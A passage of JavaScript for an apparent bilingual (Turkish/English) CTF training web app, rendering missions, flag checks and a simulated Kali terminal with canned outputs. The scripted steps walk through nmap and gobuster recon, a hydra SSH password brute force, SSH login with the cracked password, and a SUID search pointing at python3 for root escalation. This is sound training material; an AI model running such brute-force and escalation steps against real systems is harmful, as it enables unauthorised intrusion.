            if (ctfState.activeFilter !== 'all' && m.group !== ctfState.activeFilter) {
                return '';
            }
            const isCompleted = ctfState.completed.includes(m.id);
            const isUnlocked = idx <= ctfState.unlockedIdx || isCompleted;
            const isActive = idx === ctfState.activeIdx;

            let statusIcon = '🔒';
            let statusClass = 'locked';
            let statusText = isEn ? 'Locked' : 'Kilitli';

            if (isCompleted) {
                statusIcon = '✔';
                statusClass = 'completed';
                statusText = isEn ? 'Solved' : 'Bitti';
            } else if (isUnlocked) {
                statusIcon = '⚡';
                statusClass = 'unlocked';
                statusText = isEn ? 'Open' : 'Açık';
            }

            if (isActive) statusClass += ' active';

            const rawTitle = (isEn && m.title_en) ? m.title_en : m.title;
            const shortTitle = rawTitle.replace('Operasyon ', '').replace('Operation ', '').split('(')[0].trim();

            return `
                <div class="ctf-stepper-item ${statusClass}" data-stage-idx="${idx}">
                    <div class="ctf-stepper-top-row">
                        <span style="color: ${m.badgeColor};">${isEn ? 'LVL' : 'SEVİYE'} ${m.level}</span>
                        <span>${statusIcon} ${statusText} <strong style="color:#10b981;margin-left:2px;">+${m.xp}</strong></span>
                    </div>
                    <div class="ctf-stepper-title" title="${escapeHtml(rawTitle)}">${escapeHtml(shortTitle)}</div>
                </div>
            `;
        }).join('');

        nav.querySelectorAll('.ctf-stepper-item').forEach(item => {
            item.addEventListener('click', () => {
                const idx = parseInt(item.dataset.stageIdx, 10);
                const isComp = ctfState.completed.includes(CTF_MISSIONS[idx].id);
                if (idx <= ctfState.unlockedIdx || isComp) {
                    ctfState.activeIdx = idx;
                    saveCtfProgressToStorage();
                    renderCtfProgress();
                    renderCtfStageTabs();
                    renderCtfBriefing(idx);
                    updateCtfTerminalTarget();
                } else {
                    const prevLvl = CTF_MISSIONS[idx - 1] ? CTF_MISSIONS[idx - 1].level : '1.1';
                    showToast(
                        'error',
                        isEn ? 'Locked Level' : 'Kilitli Seviye',
                        isEn ? `Complete Level ${prevLvl} first to unlock this operation.` : `Bu seviyeyi açmak için önce Seviye ${prevLvl} operasyonunu tamamlamalısınız.`
                    );
                }
            });
        });
    }

    function markMissionStepDone(missionId, stepIndex) {
        if (!ctfState.completedSteps[missionId]) {
            ctfState.completedSteps[missionId] = [];
        }
        if (!ctfState.completedSteps[missionId].includes(stepIndex)) {
            ctfState.completedSteps[missionId].push(stepIndex);
            saveCtfProgressToStorage();
            renderCtfBriefing(ctfState.activeIdx);
        }
    }

    function checkAndMarkStepForCommand(m, lowerCmd) {
        if (!m || !Array.isArray(m.steps)) return;
        m.steps.forEach((step, sIdx) => {
            const allMatch = (step.match || []).every(keyword => lowerCmd.includes(keyword.toLowerCase()));
            if (allMatch) {
                markMissionStepDone(m.id, sIdx);
            }
        });
    }

    function renderCtfBriefing(idx) {
        const box = document.getElementById('ctf-briefing-box');
        if (!box) return;

        const m = CTF_MISSIONS[idx] || CTF_MISSIONS[0];
        const isCompleted = ctfState.completed.includes(m.id);
        const isEn = (window.I18N && I18N.currentLang === 'en');
        const doneArr = ctfState.completedSteps[m.id] || [];

        const titleTxt = (isEn && m.title_en) ? m.title_en : m.title;
        const levelLbl = (isEn && m.levelLabel_en) ? m.levelLabel_en : m.levelLabel;
        const catTxt = (isEn && m.category_en) ? m.category_en : m.category;
        const targetTxt = (isEn && m.target_en) ? m.target_en : m.target;
        const storyHtml = (isEn && m.story_en) ? m.story_en : m.story;

        const stepsHtml = (m.steps || []).map((st, sIdx) => {
            const isStepDone = isCompleted || doneArr.includes(sIdx);
            const stTitle = (isEn && st.label_en) ? st.label_en : st.label;
            return `
                <div class="ctf-step-row ${isStepDone ? 'done' : ''}">
                    <span class="ctf-step-check">${isStepDone ? '✔' : (sIdx + 1)}</span>
                    <div class="ctf-step-info">
                        <div class="ctf-step-title">${escapeHtml(stTitle)}</div>
                        <span class="ctf-step-cmd">$ ${escapeHtml(st.cmd)}</span>
                    </div>
                    <button type="button" class="ctf-step-run-btn" data-run-ctf-cmd="${escapeHtml(st.cmd)}" title="${isEn ? 'Execute in CTF Terminal' : 'CTF Terminalinde Çalıştır'}">
                        ⚡ ${isEn ? 'Run' : 'Çalıştır'}
                    </button>
                </div>
            `;
        }).join('');

        const doneCount = isCompleted ? (m.steps || []).length : doneArr.length;
        const totalSteps = (m.steps || []).length;

        box.innerHTML = `
            <div class="ctf-card-top">
                <div class="ctf-card-badges">
                    <span class="ctf-mini-pill" style="background: rgba(${hexToRgb(m.badgeColor)}, 0.15); color: ${m.badgeColor}; border: 1px solid ${m.badgeColor};">${escapeHtml(levelLbl)}</span>
                    <span class="ctf-mini-pill" style="background: rgba(255, 255, 255, 0.05); color: #cbd5e1; border: 1px solid rgba(255, 255, 255, 0.1);">${escapeHtml(catTxt)}</span>
                    <span class="ctf-mini-pill" style="background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid #10b981;">+${m.xp} XP</span>
                </div>
                <div class="ctf-target-label">
                    <span class="pulsing-beacon" style="width: 5px; height: 5px; background: var(--cyan); display: inline-block; vertical-align: middle; margin-right: 4px;"></span>
                    <span>🎯 ${escapeHtml(targetTxt)}</span>
                </div>
            </div>

            <h2 class="ctf-mission-heading">${escapeHtml(titleTxt)}</h2>

            <!-- Story Narrative -->
            <div class="ctf-brief-box">
                ${storyHtml}
            </div>

            <!-- Interactive Step-by-Step Mission Chain -->
            <div class="ctf-steps-box">
                <div class="ctf-steps-header">
                    <span>🎯 ${isEn ? 'STEP-BY-STEP ATTACK / DEFENSE CHAIN' : 'ADIM ADIM OPERASYON GÖREV ZİNCİRİ'}</span>
                    <span style="color: ${doneCount === totalSteps ? '#10b981' : '#94a3b8'};">${doneCount}/${totalSteps} ${isEn ? 'Steps' : 'Adım'}</span>
                </div>
                ${stepsHtml}
            </div>

            <!-- Tactical Hint Accordion -->
            <div class="ctf-hint-container" id="ctf-hint-accordion">
                <button type="button" class="ctf-hint-btn" id="btn-toggle-ctf-hint">
                    <span style="display: flex; align-items: center; gap: 6px;">💡 ${isEn ? 'Tactical Hint & Command Reference' : 'Taktik İpucu & Önerilen Kodlar (Takılırsan Tıkla)'}</span>
                    <span id="ctf-hint-icon">&darr;</span>
                </button>
                <div class="ctf-hint-body" id="ctf-hint-text-area">
                    <div style="margin-bottom: 10px; line-height: 1.55;">${m.hint}</div>
                </div>
            </div>

            <!-- Flag Submission -->
            <div class="ctf-flag-container">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <span style="font-size: 11px; font-family: var(--font-mono); font-weight: 700; color: #cbd5e1;">${isEn ? 'FLAG SUBMISSION VAULT:' : 'BAYRAK TESLİM ALANI:'}</span>
                    ${isCompleted ? `<span style="color: #10b981; font-weight: 700; font-size: 10.5px; font-family: var(--font-mono);">✔ ${isEn ? 'SOLVED' : 'ÇÖZÜLDÜ'}</span>` : ''}
                </div>
                <div class="ctf-flag-row">
                    <input type="text" class="ctf-input-field" id="ctf-flag-input-field" placeholder="LFL{...}" value="${isCompleted ? m.flag : ''}" ${isCompleted ? 'readonly' : ''} autocomplete="off" spellcheck="false" />
                    <button type="button" class="ctf-btn-verify" id="btn-submit-ctf-flag">
                        <span>🚩 ${isEn ? 'Verify' : 'Doğrula'}</span>
                    </button>
                </div>
                <div class="ctf-alert-box" id="ctf-feedback-msg-box"></div>
            </div>
        `;

        // Bind quick-run step buttons
        box.querySelectorAll('[data-run-ctf-cmd]').forEach(btn => {
            btn.addEventListener('click', () => {
                const cmdToRun = btn.getAttribute('data-run-ctf-cmd');
                if (cmdToRun) {
                    ctfState.history.push(cmdToRun);
                    ctfState.historyIdx = ctfState.history.length;
                    executeCtfCommand(cmdToRun);
                }
            });
        });

        // Hint toggle listener
        const hintBox = document.getElementById('ctf-hint-accordion');
        const btnHint = document.getElementById('btn-toggle-ctf-hint');
        if (hintBox && btnHint) {
            btnHint.addEventListener('click', () => {
                hintBox.classList.toggle('open');
                const icon = document.getElementById('ctf-hint-icon');
                if (icon) icon.textContent = hintBox.classList.contains('open') ? '↑' : '↓';
            });
        }

        // Flag submit listener
        const btnSubmit = document.getElementById('btn-submit-ctf-flag');
        const flagInput = document.getElementById('ctf-flag-input-field');
        if (btnSubmit && flagInput) {
            btnSubmit.addEventListener('click', () => {
                submitCtfFlag(flagInput.value);
            });
            flagInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    submitCtfFlag(flagInput.value);
                }
            });
        }
    }

    function hexToRgb(hex) {
        hex = hex.replace('#', '');
        if (hex.length === 3) hex = hex.split('').map(c => c + c).join('');
        const num = parseInt(hex, 16);
        return `${(num >> 16) & 255}, ${(num >> 8) & 255}, ${num & 255}`;
    }

    function submitCtfFlag(rawFlag) {
        const flag = (rawFlag || '').trim();
        const m = CTF_MISSIONS[ctfState.activeIdx];
        const feedback = document.getElementById('ctf-feedback-msg-box');
        const inputEl = document.getElementById('ctf-flag-input-field');

        if (!flag) {
            if (feedback) {
                feedback.className = 'ctf-feedback-msg error';
                feedback.innerHTML = 'Lütfen bir bayrak (LFL{...}) giriniz!';
            }
            return;
        }

        if (flag === m.flag) {
            if (inputEl) inputEl.value = m.flag;

            if (!ctfState.completed.includes(m.id)) {
                ctfState.completed.push(m.id);
                ctfState.xp += m.xp;

                // Mark all steps done for this mission
                ctfState.completedSteps[m.id] = (m.steps || []).map((_, idx) => idx);

                // Unlock next stage
                if (ctfState.activeIdx + 1 > ctfState.unlockedIdx && ctfState.activeIdx + 1 < CTF_MISSIONS.length) {
                    ctfState.unlockedIdx = ctfState.activeIdx + 1;
                }
                saveCtfProgressToStorage();
            }

            if (feedback) {
                feedback.className = 'ctf-feedback-msg success';
                feedback.innerHTML = `<strong>✔ TEBRİKLER!</strong> ${escapeHtml(m.successMsg)} <span style="color: #10b981; font-weight: 700;">(+${m.xp} XP)</span>`;
            }

            showToast('success', '🚩 Bayrak Yakalandı!', `Tebrikler! ${m.title} başarıyla tamamlandı. (+${m.xp} XP)`);

            if (ctfState.completed.length >= CTF_MISSIONS.length) {
                setTimeout(() => {
                    showToast('success', '👑 EFSANEVİ CTF ŞAMPİYONU!', 'Tebrikler! 10 kademeli siber operasyonun tamamını bitirerek 6000 XP topladınız!');
                }, 500);
            }

            renderCtfProgress();
            renderCtfStageTabs();
            renderCtfBriefing(ctfState.activeIdx);

            // Print in CTF terminal
            printCtfOutput(`\n<span style="color: #10b981; font-weight: 700;">[+] ==============================================================</span>\n<span style="color: #10b981; font-weight: 800;">[+] FLAG CAPTURED: ${escapeHtml(m.flag)}</span>\n<span style="color: #10b981; font-weight: 700;">[+] TEBRİKLER! Seviye ${m.level} başarıyla tamamlandı! (+${m.xp} XP)</span>\n<span style="color: #10b981; font-weight: 700;">[+] ==============================================================</span>\n`);

            // Transition to next level after delay
            if (ctfState.activeIdx < CTF_MISSIONS.length - 1) {
                setTimeout(() => {
                    ctfState.activeIdx++;
                    renderCtfProgress();
                    renderCtfStageTabs();
                    renderCtfBriefing(ctfState.activeIdx);
                    updateCtfTerminalTarget();
                }, 1700);
            }
        } else {
            if (feedback) {
                feedback.className = 'ctf-feedback-msg error';
                feedback.innerHTML = '❌ Hatalı bayrak! Lütfen görev adımlarını ve terminal çıktılarını inceleyerek tekrar deneyin.';
            }
            showToast('error', 'Hatalı Bayrak', 'Girdiğiniz bayrak bu görevle eşleşmedi.');
        }
    }
    window.submitCtfFlag = submitCtfFlag;

    function updateCtfTerminalTarget() {
        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
        ctfState.sshSessionActive = false;

        clearCtfTerminal();

        const promptEl = document.getElementById('ctf-term-prompt-label');
        if (promptEl) promptEl.textContent = 'root@kali-ctf:~#';

        const badgeText = document.getElementById('ctf-term-title-text');
        if (badgeText) {
            badgeText.textContent = `root@kali-ctf:~# [${m.target}]`;
        }

        printCtfOutput(`
<span style="color: #00e5ff; font-weight: 800;">┌──(root㉿kali-ctf)-[~]</span>
<span style="color: #94a3b8;">│ LFL CTF OPERASYONU // SEVİYE ${m.level}: ${escapeHtml(m.title)} (+${m.xp} XP)</span>
<span style="color: #94a3b8;">│ Hedef Sistem: ${escapeHtml(m.target)}</span>
<span style="color: #00e5ff; font-weight: 800;">└─#</span> <span style="color: #10b981;">Terminal hazır. Soldaki adımlardan ⚡ Çalıştır'a tıklayın veya komutları aşağıya yazın.</span>
        `);

        const input = document.getElementById('ctf-term-command-input');
        if (input) {
            input.value = '';
            input.focus();
        }
    }

    function renderAutoClaimFlagBtn(flagStr) {
        return `<div style="margin-top: 6px;"><button type="button" class="ctf-auto-claim-btn" data-auto-claim-flag="${escapeHtml(flagStr)}">🚩 Bayrağı Otomatik Teslim Et (${escapeHtml(flagStr)})</button></div>`;
    }

    function printCtfOutput(html) {
        const out = document.getElementById('ctf-term-output-area');
        if (!out) return;
        const div = document.createElement('div');
        div.innerHTML = html;

        // Bind any auto-claim flag button inside output
        div.querySelectorAll('[data-auto-claim-flag]').forEach(btn => {
            btn.addEventListener('click', () => {
                const f = btn.getAttribute('data-auto-claim-flag');
                if (f) submitCtfFlag(f);
            });
        });

        out.appendChild(div);

        const screen = document.getElementById('ctf-term-screen');
        if (screen) screen.scrollTop = screen.scrollHeight;
    }

    function clearCtfTerminal() {
        const out = document.getElementById('ctf-term-output-area');
        if (out) out.innerHTML = '';
    }

    function resetCtfTerminal() {
        clearCtfTerminal();
        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
        printCtfOutput(`
<span style="color: #00e5ff; font-weight: 800;">┌──(root㉿kali-ctf)-[~]</span>
<span style="color: #94a3b8;">│ LFL SİBER CTF OPERASYON LABORATUVARI // KADEME: SEVİYE ${m.level} (+${m.xp} XP)</span>
<span style="color: #94a3b8;">│ Hedef Sistem: ${escapeHtml(m.target)}</span>
<span style="color: #94a3b8;">│ Sitedeki 143+ Kali Linux aracı ve 10 CTF senaryosu aktif.</span>
<span style="color: #00e5ff; font-weight: 800;">└─#</span> <span style="color: #10b981;">Simülasyon hazır. Soldaki görev adımlarından ⚡ Çalıştır'a basın veya doğrudan yazın.</span>
        `);
    }

    function bindCtfTerminal() {
        resetCtfTerminal();

        const input = document.getElementById('ctf-term-command-input');
        const btnClear = document.getElementById('btn-clear-ctf-term');
        const btnReset = document.getElementById('btn-reset-ctf-term');
        const btnNextStep = document.getElementById('btn-ctf-run-next-step');

        if (btnClear) btnClear.addEventListener('click', clearCtfTerminal);
        if (btnReset) btnReset.addEventListener('click', resetCtfTerminal);

        if (btnNextStep) {
            btnNextStep.addEventListener('click', () => {
                const m = CTF_MISSIONS[ctfState.activeIdx];
                if (!m || !Array.isArray(m.steps)) return;
                const doneArr = ctfState.completedSteps[m.id] || [];
                const nextStep = m.steps.find((_, idx) => !doneArr.includes(idx)) || m.steps[0];
                if (nextStep && nextStep.cmd) {
                    ctfState.history.push(nextStep.cmd);
                    ctfState.historyIdx = ctfState.history.length;
                    executeCtfCommand(nextStep.cmd);
                }
            });
        }

        let ctfTabCursor = -1;
        let lastCtfPrefix = null;

        if (input) {
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const cmd = input.value.trim();
                    if (!cmd) return;

                    ctfState.history.push(cmd);
                    ctfState.historyIdx = ctfState.history.length;
                    input.value = '';
                    ctfTabCursor = -1;
                    lastCtfPrefix = null;

                    executeCtfCommand(cmd);
                } else if (e.key === 'Tab') {
                    e.preventDefault();
                    const m = CTF_MISSIONS[ctfState.activeIdx];
                    const missionCmds = (m && m.quickCmds) ? m.quickCmds : [];
                    const baseCmds = ['help', 'clear', 'whoami', 'id', 'pwd', 'ls -la', 'uname -a'];
                    const academyCmds = (window.ACADEMY_COMMANDS || []).map(c => c.cmd);
                    const pool = Array.from(new Set([...missionCmds, ...baseCmds, ...academyCmds]));

                    const currentVal = input.value.trim();
                    const currentLower = currentVal.toLowerCase();
                    let matches = [];

                    if (!currentVal) {
                        matches = missionCmds.length > 0 ? missionCmds : pool.slice(0, 8);
                    } else {
                        const mPrefix = missionCmds.filter(c => c.toLowerCase().startsWith(currentLower));
                        const allPrefix = pool.filter(c => c.toLowerCase().startsWith(currentLower));
                        const allSubstr = pool.filter(c => !c.toLowerCase().startsWith(currentLower) && c.toLowerCase().includes(currentLower));

                        matches = Array.from(new Set([...mPrefix, ...allPrefix, ...allSubstr]));

                        if (currentLower.startsWith('sub') || currentLower.startsWith('lfl')) {
                            if (m && m.flag) {
                                matches.unshift(`submit ${m.flag}`);
                            }
                        }
                    }

                    if (matches.length > 0) {
                        if (lastCtfPrefix === currentLower) {
                            ctfTabCursor = (ctfTabCursor + 1) % matches.length;
                        } else {
                            ctfTabCursor = 0;
                            lastCtfPrefix = currentLower;
                        }
                        input.value = matches[ctfTabCursor];
                        input.selectionStart = input.selectionEnd = input.value.length;
                    }
                } else if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    lastCtfPrefix = null;
                    if (ctfState.historyIdx > 0) {
                        ctfState.historyIdx--;
                        input.value = ctfState.history[ctfState.historyIdx] || '';
                    }
                } else if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    lastCtfPrefix = null;
                    if (ctfState.historyIdx < ctfState.history.length - 1) {
                        ctfState.historyIdx++;
                        input.value = ctfState.history[ctfState.historyIdx] || '';
                    } else {
                        ctfState.historyIdx = ctfState.history.length;
                        input.value = '';
                    }
                } else {
                    lastCtfPrefix = null;
                }
            });
        }
    }

    function executeCtfCommand(rawCmd) {
        const cmd = rawCmd.trim();
        const lower = cmd.toLowerCase();
        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
        const promptLabel = ctfState.sshSessionActive ? 'operator@fortress:~$' : 'root@kali-ctf:~#';

        // Echo prompt & command
        printCtfOutput(`<div style="margin-top: 6px;"><span style="color: #00e5ff; font-weight: 700;">${promptLabel}</span> <span style="color: #ffffff;">${escapeHtml(cmd)}</span></div>`);

        // Check if command completes any step in current mission
        checkAndMarkStepForCommand(m, lower);

        // Check clear
        if (lower === 'clear' || lower === 'cls') {
            clearCtfTerminal();
            return;
        }

        // Direct flag submission via terminal
        if (lower.startsWith('submit ') || lower.startsWith('lfl{')) {
            const flagCandidate = cmd.toLowerCase().startsWith('submit ') ? cmd.substring(7).trim() : cmd;
            submitCtfFlag(flagCandidate);
            return;
        }

        // God Mode for burak_wyxz
        if (lower === 'godmode' || lower === 'admin') {
            const isAdmin = state.currentUser && state.currentUser.username === 'burak_wyxz';
            if (isAdmin) {
                printCtfOutput(`
<pre style="color: #10b981; font-weight: 800; font-family: var(--font-mono);">
[★] ==============================================================
[★] LFL CYBER CTF // ROOT MASTER CONSOLE (burak_wyxz)
[★] ==============================================================
[+] Operatör          : burak_wyxz (Baş Yönetici)
[+] CTF Puanı         : ${ctfState.xp} / 6000 XP
[+] Tamamlanan Görev  : ${ctfState.completed.length} / ${CTF_MISSIONS.length}
[+] İpucu             : '👑 Master Root Key' butonuna basarak 10 aşamayı anında açabilirsiniz.
[★] ==============================================================
</pre>`);
            } else {
                printCtfOutput(`<span style="color: #ef4444; font-weight: 700;">[!] Erişim Reddedildi: God Mode yalnızca yönetici burak_wyxz içindir.</span>`);
            }
            return;
        }

        // Help
        if (lower === 'help') {
            printCtfOutput(`
<pre style="color: #38bdf8;">
LFL CYBER CTF // YARDIM &amp; KULLANILABİLİR KOMUTLAR
===================================================================
Bu operasyonda LFL Siber Kütüphanesi'ndeki 143+ Kali aracı çalışır.
Aktif Seviye (${m.level}) için önerilen araçlar:
  ${m.tools.map(t => `<span style="color: #22c55e; font-weight: 700;">${t}</span>`).join(' &bull; ')}

Hızlı Kullanım:
  submit LFL{...}           : Bulduğun bayrağı terminalden teslim et
  clear                     : Ekranı temizle
  help                      : Bu yardım ekranını göster
</pre>
            `);
            return;
        }

        // Standard Linux inspection commands
        if (lower === 'whoami') {
            printCtfOutput(`<pre style="color: #a7f3d0;">${ctfState.sshSessionActive ? 'operator' : 'root'}</pre>`);
            return;
        }
        if (lower === 'pwd') {
            printCtfOutput(`<pre style="color: #a7f3d0;">${ctfState.sshSessionActive ? '/home/operator' : '/root'}</pre>`);
            return;
        }
        if (lower === 'id') {
            printCtfOutput(`<pre style="color: #a7f3d0;">${ctfState.sshSessionActive ? 'uid=1001(operator) gid=1001(operator) groups=1001(operator)' : 'uid=0(root) gid=0(root) groups=0(root)'}</pre>`);
            return;
        }
        if (lower === 'uname -a') {
            printCtfOutput(`<pre style="color: #a7f3d0;">Linux lfl-ctf-node 6.8.11-kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 2026.1 x86_64 GNU/Linux</pre>`);
            return;
        }

        // ==========================================
        // MISSION 1.1: Operasyon Kapı Çalan
        // ==========================================
        if (m.id === 'm1_1') {
            if (lower.includes('ping') && lower.includes('10.10.1.5')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
PING 10.10.1.5 (10.10.1.5) 56(84) bytes of data.
64 bytes from 10.10.1.5: icmp_seq=1 ttl=64 time=1.24 ms
64 bytes from 10.10.1.5: icmp_seq=2 ttl=64 time=1.12 ms
64 bytes from 10.10.1.5: icmp_seq=3 ttl=64 time=1.18 ms

--- 10.10.1.5 ping statistics ---
3 packets transmitted, 3 received, <span style="color: #22c55e; font-weight: 700;">0% packet loss</span>, time 2004ms
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Hedef sunucu ayakta! Şimdi nmap -sV 10.10.1.5 ile servisleri tarayın.</span>
</pre>`);
                return;
            }
            if (lower.includes('nmap') && lower.includes('10.10.1.5')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-10 01:00 UTC
Nmap scan report for 10.10.1.5
PORT   STATE SERVICE VERSION
<span style="color: #38bdf8; font-weight: 700;">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6</span>
<span style="color: #22c55e; font-weight: 700;">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
|_http-title: LFL Internal Gateway Portal
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Port 80 açık! curl -I http://10.10.1.5 ile HTTP başlıklarını inceleyin.</span>
</pre>`);
                return;
            }
            if (lower.includes('curl') && lower.includes('10.10.1.5')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
<span style="color: #f59e0b; font-weight: 800;">X-Secret-Auth: TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==</span>
Content-Type: text/html
<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: X-Secret-Auth başlığı bulundu! Base64 değerini çözün.</span>
</pre>`);
                return;
            }
            if (lower.includes('base64') && (lower.includes('tezme') || lower.includes('echo'))) {
                printCtfOutput(`
<pre style="color: #22c55e; font-weight: 800;">
[★] DEŞİFRE EDİLEN BAYRAK: LFL{level1_1_ag_kesif_basarans}
</pre>
${renderAutoClaimFlagBtn('LFL{level1_1_ag_kesif_basarans}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 1.2: Operasyon Hayalet Not
        // ==========================================
        if (m.id === 'm1_2') {
            if (lower.includes('ls') && lower.includes('/var/backups')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
total 16
drwxr-xr-x 2 root root 4096 Nov 10 01:40 .
-rw-r--r-- 1 root root  512 Nov 10 01:42 backup_system.tar.gz
<span style="color: #f59e0b; font-weight: 700;">-rw-r--r-- 1 root root  240 Nov 10 01:45 operator_note.txt</span>
-rw-r--r-- 1 root root 1024 Nov 10 01:41 shadow.bak
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: operator_note.txt bulundu! cat /var/backups/operator_note.txt ile okuyun.</span>
</pre>`);
                return;
            }
            if (lower.includes('cat') && lower.includes('operator_note.txt')) {
                printCtfOutput(`
<pre style="color: #f59e0b;">
=====================================================
AJAN NOTU // GİZLİ
=====================================================
Sızma testi sırasında oluşan denetim izleri doğrudan
/var/log/syslog dosyasına "LFL{" ön ekiyle damgalandı.
=====================================================
</pre>
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Şimdi grep -i "LFL{" /var/log/syslog komutuyla bayrağı çekin.</span>`);
                return;
            }
            if (lower.includes('grep') && (lower.includes('syslog') || lower.includes('lfl'))) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Nov 10 01:44:12 fortress kernel: [184.20] audit: apparmor="DENIED"
<span style="color: #22c55e; font-weight: 800;">Nov 10 01:45:00 fortress security_daemon[4091]: [FLAG_LEAK] Operator token: LFL{level1_2_linux_dosya_adli_analiz}</span>
</pre>
${renderAutoClaimFlagBtn('LFL{level1_2_linux_dosya_adli_analiz}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 2.1: Operasyon Derin Dizin
        // ==========================================
        if (m.id === 'm2_1') {
            if (lower.includes('whatweb') && lower.includes('10.10.2.10')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
http://10.10.2.10 [200 OK] Apache[2.4.56], Ubuntu Linux, PHP[8.2.14], Title[LFL Corporate Intranet]
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Web altyapısı tespit edildi. gobuster ile dizinleri tarayın.</span>
</pre>`);
                return;
            }
            if (lower.includes('gobuster') && lower.includes('10.10.2.10')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
===============================================================
Gobuster v3.6 - Directory brute forcing mode
===============================================================
<span style="color: #22c55e; font-weight: 700;">/robots.txt           (Status: 200) [Size: 78]</span>
/index.php            (Status: 200) [Size: 2410]
<span style="color: #f59e0b; font-weight: 700;">/admin_vault          (Status: 301) [Size: 195] --&gt; /admin_vault/</span>
===============================================================
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: /robots.txt ve /admin_vault bulundu! curl http://10.10.2.10/robots.txt ile inceleyin.</span>
</pre>`);
                return;
            }
            if (lower.includes('curl') && lower.includes('robots.txt')) {
                printCtfOutput(`
<pre style="color: #f59e0b;">
User-agent: *
Disallow: /admin_vault/confidential_token.json
</pre>
<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Gizli JSON yolu bulundu! curl http://10.10.2.10/admin_vault/confidential_token.json çalıştırın.</span>`);
                return;
            }
            if (lower.includes('curl') && lower.includes('confidential_token.json')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
{
  "vault_name": "LFL_RESTRICTED_ACCESS_PORTAL",
  "encryption": "AES-GCM-256",
  <span style="color: #22c55e; font-weight: 800;">"master_flag": "LFL{level2_1_web_dizin_firtinasi}"</span>
}
</pre>
${renderAutoClaimFlagBtn('LFL{level2_1_web_dizin_firtinasi}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 2.2: Operasyon Gömülü Bellek
        // ==========================================
        if (m.id === 'm2_2') {
            if (lower.includes('file') && lower.includes('suspect_payload.bin')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
/evidence/suspect_payload.bin: ELF 64-bit LSB shared object, x86-64, dynamically linked, stripped
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Dosya 64-bit ELF binary. md5sum ve strings analizine geçin.</span>
</pre>`);
                return;
            }
            if (lower.includes('md5sum') && lower.includes('suspect_payload.bin')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
<span style="color: #38bdf8; font-weight: 700;">8f4b23d91e60cb27a819ec41d08c5b91</span>  /evidence/suspect_payload.bin
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Adli MD5 özeti doğrulandı. Şimdi strings komutunu çalıştırın.</span>
</pre>`);
                return;
            }
            if (lower.includes('strings') && lower.includes('suspect_payload.bin')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
/lib64/ld-linux-x86-64.so.2
LFL_SUSPECT_PAYLOAD_INTERNAL_v2.4
DEBUG_KEY=0x7ffcd3e0
<span style="color: #22c55e; font-weight: 800;">CONFIDENTIAL_REVERSED_FLAG=LFL{level2_2_adli_bilisim_strings_ustasi}</span>
</pre>
${renderAutoClaimFlagBtn('LFL{level2_2_adli_bilisim_strings_ustasi}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 3.1: Operasyon Kale Kuşatması
        // ==========================================
        if (m.id === 'm3_1') {
            if (lower.includes('hydra') && lower.includes('10.10.3.50')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Hydra v9.5 (c) 2023 by van Hauser/THC - Attacking ssh://10.10.3.50:22/
<span style="color: #22c55e; font-weight: 800;">[22][ssh] host: 10.10.3.50   login: operator   password: cyber2026</span>
1 of 1 target successfully completed, 1 valid password found
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Parola kırıldı! Şimdi ssh operator@10.10.3.50 ile bağlanın.</span>
</pre>`);
                return;
            }
            if (lower.includes('ssh') && lower.includes('10.10.3.50')) {
                ctfState.sshSessionActive = true;
                const promptEl = document.getElementById('ctf-term-prompt-label');
                if (promptEl) promptEl.textContent = 'operator@fortress:~$';

                printCtfOutput(`
<pre style="color: #94a3b8;">
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)
<span style="color: #22c55e; font-weight: 700;">operator@fortress:~$</span>
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: SSH Oturumu Açıldı! SUID dosyaları arayın: find / -perm -4000 2&gt;/dev/null</span>
</pre>`);
                return;
            }
            if (lower.includes('find') && lower.includes('-4000')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
/usr/bin/passwd
/usr/bin/sudo
<span style="color: #ef4444; font-weight: 800;">/usr/bin/python3 (CRITICAL SUID BIT SET - root execution allowed!)</span>
<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: SUID yetkisi bulundu! Şimdi cat /root/flag.txt ile bayrağı okuyun.</span>
</pre>`);
